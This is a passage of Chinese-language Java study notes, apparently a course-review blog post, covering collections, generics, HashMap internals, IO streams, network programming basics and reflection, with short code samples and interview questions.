<li>迭代器不负责数据的存储；负责对集合类的遍历<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 如何获取迭代器(Iterator)对象？</span><br><span class="line"><span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> coll.iterator();</span><br><span class="line"><span class="number">1.</span> 如何实现遍历(代码实现)</span><br><span class="line"><span class="keyword">while</span>(iterator.hasNext())&#123;</span><br><span class="line">    System.out.println(iterator.next()); <span class="comment">//next():①指针下移 ② 将下移以后集合位置上的元素返回</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>Collection的子接口：List</strong></p>
<ul>
<li>常用方法<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">小结：</span><br><span class="line">    增</span><br><span class="line">        add(Object obj)</span><br><span class="line">        addAll(Collection coll)</span><br><span class="line">    删</span><br><span class="line">        remove(Object obj)</span><br><span class="line">        remove(<span class="type">int</span> index)</span><br><span class="line">    改</span><br><span class="line">        set(<span class="type">int</span> index, Object ele)</span><br><span class="line">    查</span><br><span class="line">        get(<span class="type">int</span> index)</span><br><span class="line">    插</span><br><span class="line">        add(<span class="type">int</span> index, Object ele)</span><br><span class="line">        addAll(<span class="type">int</span> index, Collection eles)</span><br><span class="line">    长度</span><br><span class="line">        size()</span><br><span class="line">    遍历</span><br><span class="line">        iterator() ：使用迭代器进行遍历</span><br><span class="line">        增强<span class="keyword">for</span>循环</span><br><span class="line">        一般的<span class="keyword">for</span>循环</span><br></pre></td></tr></table></figure></li>
</ul>
<p>List及其实现类特点<br>java.util.Collection:存储一个一个的数据<br>    |—–子接口：List:存储有序的、可重复的数据 (“动态”数组)<br>           |—- ArrayList:List的主要实现类；线程不安全的、效率高；底层使用Object[]数组存储<br>                           在添加数据、查找数据时，效率较高；在插入、删除数据时，效率较低<br>           |—- LinkedList:底层使用双向链表的方式进行存储；在对集合中的数据进行频繁的删除、插入操作时，建议							使用此类在插入、删除数据时，效率较高；在添加数据、查找数据时，效率较低；<br>           |—- Vector:List的古老实现类；线程安全的、效率低；底层使用Object[]数组存储</p>
<p>[面试题] ArrayList、Vector的区别？  ArrayList、LinkedList的区别？</p>
<p><strong>Collection的子接口：Set</strong></p>
<ul>
<li>Set中的常用的方法都是Collection中声明的方法，没有新增的方法</li>
<li>常见的实现类的对比</li>
</ul>
<p>java.util.Collection:存储一个一个的数据<br>    |—–子接口：Set:存储无序的、不可重复的数据(高中学习的集合)<br>           |—- HashSet：主要实现类；底层使用的是HashMap，即使用数组+单向链表+红黑树结构进行存储。（jdk8中）<br>                |—- LinkedHashSet：是HashSet的子类；在现有的数组+单向链表+红黑树结构的基础上，又添加了<br>                                     一组双向链表，用于记录添加元素的先后顺序。即：我们可以按照添加元素的顺									序实现遍历。便于频繁的查询操作。<br>           |—- TreeSet：底层使用红黑树存储。可以按照添加的元素的指定的属性的大小顺序进行遍历。</p>
<p>难点： Set中无序性、不可重复性的理解（以HashSet及其子类为例说明）</p>
<blockquote>
<p>无序性： !&#x3D; 随机性。<br>        添加元素的顺序和遍历元素的顺序不一致,是不是就是无序性呢？ No!<br>        到底什么是无序性？与添加的元素的位置有关，不像ArrayList一样是依次紧密排列的。<br>        这里是根据添加的元素的哈希值，计算的其在数组中的存储位置。此位置不是依次排列的，表现为无序性。</p>
</blockquote>
<blockquote>
<p>不可重复性：添加到Set中的元素是不能相同的。<br>         比较的标准，需要判断hashCode()得到的哈希值以及equals()得到的boolean型的结果。<br>         哈希值相同且equals()返回true，则认为元素是相同的。</p>
</blockquote>
<p>添加到HashSet&#x2F;LinkedHashSet中元素的要求:</p>
<blockquote>
<p>要求元素所在的类要重写两个方法：equals() 和 hashCode()。<br>同时，要求equals() 和 hashCode()要保持一致性！我们只需要在IDEA中自动生成两个方法的重写即可，即能保证两个方法的一致性。</p>
</blockquote>
<p>了解TreeSet的使用</p>
<p><strong>Map接口</strong><br>常用的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">增：</span><br><span class="line">    put(Object key,Object value)</span><br><span class="line">    putAll(Map m)</span><br><span class="line">删：</span><br><span class="line">    Object <span class="title function_">remove</span><span class="params">(Object key)</span></span><br><span class="line">改：</span><br><span class="line">    put(Object key,Object value)</span><br><span class="line">    putAll(Map m)</span><br><span class="line">查：</span><br><span class="line">    Object <span class="title function_">get</span><span class="params">(Object key)</span></span><br><span class="line">长度：</span><br><span class="line">    size()</span><br><span class="line">遍历：</span><br><span class="line">   遍历key集：Set <span class="title function_">keySet</span><span class="params">()</span></span><br><span class="line">   遍历value集：Collection <span class="title function_">values</span><span class="params">()</span></span><br><span class="line">   遍历entry集：Set <span class="title function_">entrySet</span><span class="params">()</span></span><br></pre></td></tr></table></figure>

<p>常用的实现类<br>java.util.Map:存储一对一对的数据(key-value键值对，(x1,y1)、(x2,y2) –&gt; y&#x3D;f(x),类似于高中的函数)<br>    |—- HashMap:主要实现类;线程不安全的，效率高;可以添加null的key和value值;底层使用数组+单向链表+红黑树结构存储（jdk8）<br>        |—- LinkedHashMap:是HashMap的子类；在HashMap使用的数据结构的基础上，增加了一对双向链表，用于记录添加的元素的先后顺序，进而我们在遍历元素时，就可以按照添加的顺序显示。开发中，对于频繁的遍历操作，建议使用此类。<br>    |—- TreeMap:底层使用红黑树存储;可以按照添加的key-value中的key元素的指定的属性的大小顺序进行遍历。需要考虑使用①自然排序 ②定制排序。<br>    |—- Hashtable:古老实现类;线程安全的，效率低;不可以添加null的key或value值;底层使用数组+单向链表结构存储（jdk8）<br>        |—- Properties:其key和value都是String类型。常用来处理属性文件。<br>[面试题] 区别HashMap和Hashtable、区别HashMap和LinkedHashMap、HashMap的底层实现（① new HashMap() ② put(key,value)）</p>
<p>HashMap中元素的特点:</p>
<blockquote>
<p>HashMap中的所有的key彼此之间是不可重复的、无序的。所有的key就构成一个Set集合。—&gt;key所在的类要重写hashCode()和equals()<br>HashMap中的所有的value彼此之间是可重复的、无序的。所有的value就构成一个Collection集合。—&gt;value所在的类要重写equals()<br>HashMap中的一个key-value,就构成了一个entry。<br>HashMap中的所有的entry彼此之间是不可重复的、无序的。所有的entry就构成了一个Set集合。</p>
</blockquote>
<ul>
<li>（了解）TreeMap的使用</li>
<li>（重要）Properties的使用</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PropertiesTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123; <span class="comment">//注意：因为设计到流的操作，为了确保流能关闭，建议使用try-catch-finally</span></span><br><span class="line">        <span class="comment">//方式1：数据和代码耦合度高；如果修改的话，需要重写的编译代码、打包发布，繁琐</span></span><br><span class="line">        <span class="comment">//数据</span></span><br><span class="line"><span class="comment">//        String name = &quot;Tom&quot;;</span></span><br><span class="line"><span class="comment">//        String password = &quot;abc123&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//代码：用于操作name,password</span></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//方式2：将数据封装到具体的配置文件中，在程序中读取配置文件中的信息。实现了</span></span><br><span class="line">        <span class="comment">//数据和代码的解耦；由于我们没有修改代码，就省去了重新编译和打包的过程。</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;info.properties&quot;</span>); <span class="comment">//注意，要提前创建好</span></span><br><span class="line"><span class="comment">//        System.out.println(file.getAbsolutePath());</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line"></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">pros</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        pros.load(fis); <span class="comment">//加载流中的文件中的数据</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取数据</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> pros.getProperty(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">pwd</span> <span class="operator">=</span> pros.getProperty(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(name + <span class="string">&quot;:&quot;</span> + pwd);</span><br><span class="line"></span><br><span class="line">        fis.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Collections工具类的使用</strong></p>
<p>区分Collection 和 Collections<br>Collection：集合框架中的用于存储一个一个元素的接口，又分为List和Set等子接口。<br>Collections：用于操作集合框架的一个工具类。此时的集合框架包括：Set、List、Map</p>
<ul>
<li>熟悉常用的Collections中的方法即可。</li>
</ul>
<h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><h3 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h3><ol>
<li>泛型的理解<ul>
<li><E> ，泛型参数，使用引用数据类型来赋值。</li>
</ul>
</li>
<li>泛型在集合、比较器中的使用（重点）<ul>
<li>集合：ArrayList、HashMap、Iterator</li>
<li>比较器：Comparable、Comparator</li>
</ul>
</li>
<li>自定义泛型类&#x2F;泛型接口、泛型方法（熟悉）<ul>
<li>class Order<T>{ }</li>
<li>public <E> 返回值类型 方法名(形参列表){}</li>
<li>具体的细节，见IDEA中的笔记。</li>
</ul>
</li>
<li>泛型在继承上的体现 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 类SuperA是类A的父类，则G&lt;SuperA&gt; 与 G&lt;A&gt;的关系：G&lt;SuperA&gt; 和 G&lt;A&gt;是并列的两个类，没有任何子父类的关系。</span><br><span class="line">比如：ArrayList&lt;Object&gt; 、ArrayList&lt;String&gt;没有关系</span><br><span class="line"></span><br><span class="line">2. 类SuperA是类A的父类或接口，SuperA&lt;G&gt; 与 A&lt;G&gt;的关系：SuperA&lt;G&gt; 与A&lt;G&gt; 有继承或实现的关系。</span><br><span class="line">即A&lt;G&gt;的实例可以赋值给SuperA&lt;G&gt;类型的引用（或变量）</span><br><span class="line">比如：List&lt;String&gt; 与 ArrayList&lt;String&gt;</span><br></pre></td></tr></table></figure></li>
<li>通配符的使用<ul>
<li>? 的使用 （重点）<ul>
<li>以集合为例：可以读取数据、不能写入数据（例外：null）</li>
</ul>
</li>
<li>? extends A<ul>
<li>以集合为例：可以读取数据、不能写入数据（例外：null）</li>
</ul>
</li>
<li>? super A<ul>
<li>以集合为例：可以读取数据、可以写入A类型或A类型子类的数据（例外：null）</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="企业真题"><a href="#企业真题" class="headerlink" title="企业真题"></a>企业真题</h3><ol>
<li>Java 的泛型是什么？有什么好处和优点？JDK 不同版本的泛型有什么区别？<br> 泛型，是程序中出现的不确定的类型。<br> 以集合来举例：把一个集合中的内容限制为一个特定的数据类型，这就是generic背后的核心思想。<br> jdk7.0新特性： <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(); <span class="comment">//类型推断</span></span><br></pre></td></tr></table></figure>
 后续版本的新特性： <figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Comparator&lt;Employee&gt; comparator = <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;&gt;()&#123;&#125; <span class="comment">//类型推断</span></span><br></pre></td></tr></table></figure></li>
<li>说说你对泛型的了解</li>
</ol>
<h2 id="数据结构和集合源码"><a href="#数据结构和集合源码" class="headerlink" title="数据结构和集合源码"></a>数据结构和集合源码</h2><h3 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h3><ol>
<li>数据结构<ul>
<li>数据结构的研究对象：<ul>
<li>① 数据间的逻辑关系（集合关系、一对一、一对多、多对多）</li>
<li>② 数据的存储结构（或物理结构）<ul>
<li>角度一：顺序结构、链式结构、索引结构、哈希结构</li>
<li>角度二：线性表（一维数组、链表、栈、队列）、树（二叉树、B+树）、图（多对多）、哈希表（HashMap、HashSet)</li>
</ul>
</li>
<li>③ 相关运算</li>
</ul>
</li>
<li>树（了解）</li>
<li>相关数据结构的核心Node的设计（单向链表、双向链表、二叉树、栈、队列）（理解）</li>
</ul>
</li>
<li>List接口下的实现类的源码剖析<br> 【面试题】ArrayList、Vector、LinkedList的三者的对比？<ul>
<li>层次1： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|-----子接口：List:存储有序的、可重复的数据 (&quot;动态&quot;数组)</span><br><span class="line">    |---- ArrayList:List的主要实现类；线程不安全的、效率高；底层使用Object[]数组存储</span><br><span class="line">                    在添加数据、查找数据时，效率较高；在插入、删除数据时，效率较低</span><br><span class="line">    |---- LinkedList:底层使用双向链表的方式进行存储；在对集合中的数据进行频繁的删除、插入操作时，建议使用此                         类在插入、删除数据时，效率较高；在添加数据、查找数据时，效率较低；</span><br><span class="line">    |---- Vector:List的古老实现类；线程安全的、效率低；底层使用Object[]数组存储</span><br></pre></td></tr></table></figure></li>
<li>层次2：查看相关api的源码（见笔记，略）</li>
</ul>
</li>
<li>Map接口下的实现类的源码剖析<ul>
<li><strong>（掌握）HashMap的底层源码的剖析</strong></li>
<li>（熟悉）LinkedHashMap的底层源码的剖析</li>
<li>（了解）HashSet、LinkedHashSet的底层源码的剖析</li>
</ul>
</li>
</ol>
<h3 id="企业真题-1"><a href="#企业真题-1" class="headerlink" title="企业真题"></a>企业真题</h3><ol>
<li>链表和数组有什么区别？<br>第14章课件里：《<code>【拓展】尚硅谷_宋红康_数据结构概述-Java版.xmind</code>》</li>
<li>栈是如何运行的？<br>先进后出。属于ADT(abstract data type)，可以使用数组、链表实现栈结构</li>
<li>ArrayList的默认大小是多少，以及扩容机制</li>
<li>ArrayList的底层是怎么实现的?<br>建议：ArrayList(int capacity){}</li>
<li>在ArrayList中remove后面几个元素该怎么做?<br>前移。</li>
<li>ArrayList1.7和1.8的区别<br>类似于饿汉式、懒汉式</li>
<li>数组和 ArrayList 的区别<br> ArrayList看做是对数组的常见操作的封装。</li>
<li>什么是线程安全的List？<br> Vector：线程安全的。<br> ArrayList：线程不安全。—-&gt; 使用同步机制处理。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap:线程不安全。 ----&gt; 使用同步机制处理。</span><br><span class="line">                -----&gt; JUC:ConcurrentHashMap</span><br></pre></td></tr></table></figure></li>
<li>说说HahMap底层实现<br>建议以JDK8为主说明。</li>
<li>HashMap初始值16，临界值12是怎么算的<br>16从底层源码的构造器中看到的。<br>12：threshold，使用数组的长度*加载因子(loadFactor)16*0，75</li>
<li>HashMap长度为什么是2的幂次方<br>为了方便计算要添加的元素的底层的索引i。</li>
<li>HashMap怎么计算哈希值和索引？扩容机制？怎么解决hash冲突？</li>
<li>HashMap底层是数组+链表，有数组很快了，为什么加链表？<br>因为产生了哈希冲突。解决方案，使用链表的方式。保证要添加的元素仍然在索引i的位置上。</li>
<li>HashMap为什么长度达到一定的长度要转化为红黑树<br>红黑树的常用操作的时间复杂度O(logn)，比单向链表的O(n)效率高。</li>
<li>HashMap什么时候扩充为红黑树，什么时候又返回到链表？<br>索引i的位置的链表长度超过8且数组长度达到64，需要索引i位置要变成红黑树。<br>当索引i的位置元素的个数低于6时，要红黑树结构转为单向链表。为什么？节省空间。</li>
<li>在 JDK1.8中，HashMap的数据结构与1.7相比有什么变化，这些变化的好处在哪里？<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">① 在jdk8中，当我们创建了HashMap实例以后，底层并没有初始化table数组。当首次添加(key,value)时，进行判断，</span><br><span class="line">如果发现table尚未初始化，则对数组进行初始化。</span><br><span class="line">② 在jdk8中，HashMap底层定义了Node内部类，替换jdk7中的Entry内部类。意味着，我们创建的数组是Node[]</span><br><span class="line">③ 在jdk8中，如果当前的(key,value)经过一系列判断之后，可以添加到当前的数组角标i中。如果此时角标i位置上有</span><br><span class="line">元素。在jdk7中是将新的(key,value)指向已有的旧的元素（头插法），而在jdk8中是旧的元素指向新的</span><br><span class="line">(key,value)元素（尾插法）。 &quot;七上八下&quot;</span><br><span class="line">④ jdk7:数组+单向链表</span><br><span class="line">jk8:数组+单向链表 + 红黑树</span><br><span class="line">什么时候会使用单向链表变为红黑树：如果数组索引i位置上的元素的个数达到8，并且数组的长度达到64时，我们就将此索引i位置上</span><br><span class="line">                            的多个元素改为使用红黑树的结构进行存储。（为什么修改呢？红黑树进行put()/get()/remove()</span><br><span class="line">                            操作的时间复杂度为O(logn)，比单向链表的时间复杂度O(n)的好。性能更高。</span><br><span class="line">什么时候会使用红黑树变为单向链表：当使用红黑树的索引i位置上的元素的个数低于6的时候，就会将红黑树结构退化为单向链表。</span><br></pre></td></tr></table></figure></li>
<li>HashMap的get()方法的原理?<br>参考put()</li>
<li>hashcode和equals区别？</li>
<li>hashCode() 与 equals() 生成算法、方法怎么重写？<br>进行equals()判断使用的属性，通常也都会参与到hashCode()的计算中。<br>尽量保证hashCode()的一致性。（使用IDEA自动生成，hashCode()自动使用相关的算法。</li>
<li>说一下equals和&#x3D;&#x3D;的区别，然后问equals相等hash值一定相等吗？hash值相等equals一定相等吗？<br>equals相等hash值一定相等吗? 是<br>hash值相等equals一定相等吗？不一定</li>
<li>HashSet存放数据的方式？</li>
<li>底层使用HashMap。说一下HashMap</li>
<li>Set是如何实现元素的唯一性？</li>
<li>用哪两种方式来实现集合的排序<br>自然排序、定制排序。</li>
</ol>
<h3 id="第15章：随堂复习与企业真题（File类与IO流）"><a href="#第15章：随堂复习与企业真题（File类与IO流）" class="headerlink" title="第15章：随堂复习与企业真题（File类与IO流）"></a>第15章：随堂复习与企业真题（File类与IO流）</h3><hr>
<h2 id="File类和IO流"><a href="#File类和IO流" class="headerlink" title="File类和IO流"></a>File类和IO流</h2><h3 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h3><ol>
<li>File类的使用<ul>
<li>File类的一个实例对应着磁盘上的一个文件或文件目录。  —-&gt; “万事万物皆对象”</li>
<li>（熟悉）File的实例化、常用的方法</li>
<li>File类中只有新建、删除、获取路径等方法，不包含读写文件的方法。此时需要使用IO流</li>
</ul>
</li>
<li>IO流的概述<ul>
<li>IO流的分类<ul>
<li>流向：输入流、输出流</li>
<li>处理数据单位：字节流、字符流</li>
<li>流的角色：节点流、处理流</li>
</ul>
</li>
<li>IO的4个抽象基类：InputStream \ OutputStream \ Reader \ Writer</li>
</ul>
</li>
<li>节点流之：文件流<ul>
<li>FileInputStream \ FileOutputStream \ FileReader \ FileWriter</li>
<li>（掌握）读写数据的过程。<ul>
<li>步骤1：创建File类的对象，作为读取或写出数据的端点</li>
<li>步骤2：创建相关的流的对象</li>
<li>步骤3：读取、写出数据的过程</li>
<li>步骤4：关闭流资源</li>
</ul>
</li>
</ul>
</li>
<li>处理流之一：缓冲流<ul>
<li>BufferedInputStream \ BufferedOutputStream \ BufferedReader \ BufferedWriter</li>
<li>作用：实现更高效的读写数据的操作</li>
</ul>
</li>
<li>处理流之二：转换流<ul>
<li>层次1：熟悉转换流的使用<ul>
<li>InputStreamReader、OutputStreamWriter</li>
</ul>
</li>
<li>层次2：（掌握）字符的编码和解码的过程、常用的字符集<ul>
<li>解决相关的问题：读写字符出现乱码！本质问题：使用的解码集与编码集不一致。</li>
</ul>
</li>
</ul>
</li>
<li>处理流之三：对象流<ul>
<li>层次1：熟悉对象流的使用<ul>
<li>ObjectInputStream:反序列化时需要使用的api</li>
<li>ObjectOutputStream:序列化时需要使用的api</li>
</ul>
</li>
<li>层次2：对象的序列化机制<ul>
<li>使用场景：不同的进程之间通信、客户端（或浏览器端）与服务器端传输数据</li>
<li>自定义类要想实现序列化机制需要满足的要求及注意点。</li>
</ul>
</li>
</ul>
</li>
<li>其它流的使用<ul>
<li>了解：数据流：DataInputStream 、DataOutputStream</li>
<li>了解：标准的输入流、标准的输出流：System.in 、System.out</li>
<li>了解：打印流：PrintStream、PrintWriter</li>
</ul>
</li>
</ol>
<h3 id="企业真题-2"><a href="#企业真题-2" class="headerlink" title="企业真题"></a>企业真题</h3><ol>
<li>谈谈Java IO里面的常用类，字节流，字符流</li>
<li>Java 中有几种类型的流？JDK为每种类型的流提供一些抽象类以供继承，请说出他们分别是哪些类？<br>InputStream \ OutputStream \ Reader \ Writer</li>
<li>流一般需不需要关闭？如果关闭的话用什么方法？处理流是怎么关闭的？<br>需要。close()处理流在关闭过程中，也会关闭内部的流。</li>
<li>OutputStream里面的write()是什么意思?<br>数据写出的意思。</li>
<li>BufferedReader属于哪种流？他主要是用来做什么的？</li>
<li>什么是缓冲区？有什么作用？<br>内部提供了一个数组，将读取或要写出的数据，现在此数组中缓存。达到一定程度时，集中性的写出。<br>作用：减少与磁盘的交互，进而提升读写效率。</li>
<li>字节流和字符流是什么？怎么转换？</li>
<li>什么是Java序列化，如何实现<br>对象序列化机制允许把内存中的Java对象转换成平台无关的二进制流，从而允许把这种二进制流持久地保存在磁盘上，<br>或通过网络将这种二进制流传输到另一个网络节点。&#x2F;&#x2F;当其它程序获取了这种二进制流，就可以恢复成原来的Java对象。</li>
<li>Java有些类中为什么需要实现Serializable接口？<br>便于此类的对象实现序列化操作。</li>
</ol>
<h2 id="网络编程"><a href="#网络编程" class="headerlink" title="网络编程"></a>网络编程</h2><h3 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h3><ul>
<li>计算机网络：略</li>
<li>网络编程的目的：直接或间接地通过网络协议与其它计算机实现数据交换，进行通讯。</li>
<li>需要解决的三个问题：<ul>
<li>问题1：如何准确地定位网络上一台或多台主机</li>
<li>问题2：如何定位主机上的特定的应用</li>
<li>问题3：找到主机后，如何可靠、高效地进行数据传输</li>
</ul>
</li>
</ul>
<ol>
<li>要素1：IP地址<ul>
<li>使用具体的一个ip地址对应具体的一个互联网上的主机</li>
<li>IP分类：<ul>
<li>角度一：IPv4、IPv6</li>
<li>角度二：公网地址、私网地址（或局域网)</li>
</ul>
</li>
<li>使用InetAddress类表示IP地址<ul>
<li>实例化：getByName(String host) 、getLocalHost()</li>
<li>常用方法：getHostName() 、getHostAddress()</li>
</ul>
</li>
</ul>
</li>
<li>要素2：端口号<ul>
<li>用于区分同一台主机上的不同的进程</li>
<li>不同的进程分配不同的端口号</li>
<li>范围：0-65535</li>
</ul>
</li>
<li>要素3：网络通信协议<ul>
<li>这里有两套参考模型<ul>
<li>OSI参考模型：模型过于理想化，未能在因特网上进行广泛推广</li>
<li>TCP&#x2F;IP参考模型(或TCP&#x2F;IP协议)：事实上的国际标准。</li>
</ul>
</li>
<li>在传输层中涉及到两个协议：TCP、UDP。二者的对比<ul>
<li>TCP：可靠的连接（发送数据前，需要三次握手、四次挥手），进行大数据量的传输，效率低。</li>
<li>UDP：不可靠的连接（发送前，不需要确认对方是否在）、使用数据报传输（限制在64kb以内）、效率高。</li>
</ul>
</li>
<li>TCP的三次握手、四次挥手（了解）</li>
</ul>
</li>
<li>TCP网络编程<ul>
<li>例题1：客户端发送内容给服务端，服务端将内容打印到控制台上。</li>
<li>例题2：客户端发送文件给服务端，服务端将文件保存在本地。</li>
<li>例题3：从客户端发送文件给服务端，服务端保存到本地。并返回“发送成功”给客户端。并关闭相应的连接。</li>
</ul>
</li>
<li>UDP网络编程<br> 简单的理解UDP的数据传输。</li>
<li>URL编程<ul>
<li>Java后台：将写好的Java程序部署在Tomcat服务器。启动Tomcat服务器。</li>
<li>前台：使用浏览器进行访问。需要使用url。（HTML+CSS+JavaScript）</li>
<li>URL的作用：定位互联网上某一资源的地址。</li>
<li>URL的格式：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.21.107:8080/examples/abcd.jpg?name=Tom   ---&gt; &quot;万事万物皆对象&quot;</span><br><span class="line">应用层协议 ip地址       端口号  资源地址   参数列表</span><br></pre></td></tr></table></figure></li>
<li>使用URL实现数据的下载（了解）</li>
</ul>
</li>
</ol>
<h3 id="企业真题-3"><a href="#企业真题-3" class="headerlink" title="企业真题"></a>企业真题</h3><ol>
<li>TCP协议和UDP协议的区别</li>
<li>简单说说TCP协议的三次握手与四次挥手机制</li>
</ol>
<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><h3 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h3><ol>
<li>反射的概述（熟悉）<ul>
<li>Java给我们提供了一套API，使用这套API我们可以在运行时动态的获取指定对象所属的类，创建运行时类的对象，调用指定的结构（属性、方法）等。</li>
<li>API：<ul>
<li><code>java.lang.Class</code>：代表一个类</li>
<li>java.lang.reflect.Method：代表类的方法</li>
<li>java.lang.reflect.Field：代表类的成员变量</li>
<li>java.lang.reflect.Constructor：代表类的构造器</li>
<li>… …</li>
</ul>
</li>
<li>反射的优点和缺点<ul>
<li><strong>优点：</strong><ul>
<li><p>提高了Java程序的灵活性和扩展性，<code>降低了耦合性</code>，提高<code>自适应</code>能力</p>
</li>
<li><p>允许程序创建和控制任何类的对象，无需提前<code>硬编码</code>目标类</p>
</li>
</ul>
</li>
<li><strong>缺点：</strong><ul>
<li>反射的<code>性能较低</code>。<ul>
<li>反射机制主要应用在对灵活性和扩展性要求很高的系统框架上</li>
</ul>
</li>
<li>反射会<code>模糊</code>程序内部逻辑，<code>可读性较差</code>。</li>
</ul>
</li>
</ul>
</li>
<li>反射，平时开发中，我们使用并不多。主要是在框架的底层使用。</li>
</ul>
</li>
<li>Class:反射的源头<ul>
<li>Class的理解 （掌握）<br>针对于编写好的.java源文件进行编译(使用javac.exe)，会生成一个或多个.class字节码文件。接着，我们使用<br>java.exe命令对指定的.class文件进行解释运行。这个解释运行的过程中，我们需要将.class字节码文件加载(使用类的加载器)到内存中(存放在方法区)。加载到内存中的.class文件对应的结构即为Class的一个实例。</li>
<li>获取Class的实例的几种方式（前三种）<ul>
<li>类.class</li>
<li>对象.getClass()</li>
<li>（使用较多）Class调用静态方法forName(String className)</li>
<li>(了解)使用ClassLoader的方法loadClass(String className)</li>
</ul>
</li>
<li>Class 可以指向哪些结构。<br>简言之，所有Java类型！<br>（1）class：外部类，成员(成员内部类，静态内部类)，局部内部类，匿名内部类<br>（2）interface：接口<br>（3）[]：数组<br>（4）enum：枚举<br>（5）annotation：注解@interface<br>（6）primitive type：基本数据类型<br>（7）void</li>
</ul>
</li>
<li>类的加载过程、类的加载器（理解）<ul>
<li><p>类的加载过程<br>过程1：类的装载(loading)<br>将类的class文件读入内存，并为之创建一个java.lang.Class对象。此过程由类加载器完成</p>
<p>过程2：链接(linking)</p>
<blockquote>
<p>验证(Verify):确保加载的类信息符合JVM规范，例如：以cafebabe开头，没有安全方面的问题。<br>准备(Prepare):正式为类变量（static）分配内存并设置类变量默认初始值的阶段，这些内存都将在方法区中进行分配。<br>解析(Resolve):虚拟机常量池内的符号引用（常量名）替换为直接引用（地址）的过程。</p>
</blockquote>
<p>过程3：初始化(initialization)<br>执行类构造器<clinit>()方法的过程。<br>类构造器<clinit>()方法是由编译期自动收集类中所有类变量的赋值动作和静态代码块中的语句合并产生的。</p>
</li>
<li><p>类的加载器<br>5.1 作用：负责类的加载，并对应于一个Class的实例。</p>
<p>5.2 分类（分为两种）：</p>
<blockquote>
<p>BootstrapClassLoader:引导类加载器、启动类加载器<br>使用C&#x2F;C++语言编写的，不能通过Java代码获取其实例<br>负责加载Java的核心库（JAVA_HOME&#x2F;jre&#x2F;lib&#x2F;rt.jar或sun.boot.class.path路径下的内容）</p>
</blockquote>
<blockquote>
<p>继承于ClassLoader的类加载器<br>ExtensionClassLoader:扩展类加载器<br>负责加载从java.ext.dirs系统属性所指定的目录中加载类库，或从JDK的安装目录的jre&#x2F;lib&#x2F;ext子目录下加载类库<br>SystemClassLoader&#x2F;ApplicationClassLoader:系统类加载器、应用程序类加载器<br>我们自定义的类，默认使用的类的加载器。<br>用户自定义类的加载器<br>实现应用的隔离（同一个类在一个应用程序中可以加载多份）；数据的加密。</p>
</blockquote>
</li>
</ul>
</li>
<li>反射的应用1：创建运行时类的对象（重点） <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Person.class;</span><br><span class="line"><span class="comment">//创建Person类的实例</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">per</span> <span class="operator">=</span> (Person) clazz.newInstance();</span><br><span class="line">System.out.println(per);</span><br></pre></td></tr></table></figure>
 要想创建对象成功，需要满足：<br> 条件1：要求运行时类中必须提供一个空参的构造器<br> 条件2：要求提供的空参的构造器的权限要足够。</li>
<li>反射的应用2：获取运行时类所有的结构<br> （了解）获取运行时类的内部结构1：所有属性、所有方法、所有构造器<br> （熟悉）获取运行时类的内部结构2：父类、接口们、包、带泛型的父类、父类的泛型等</li>
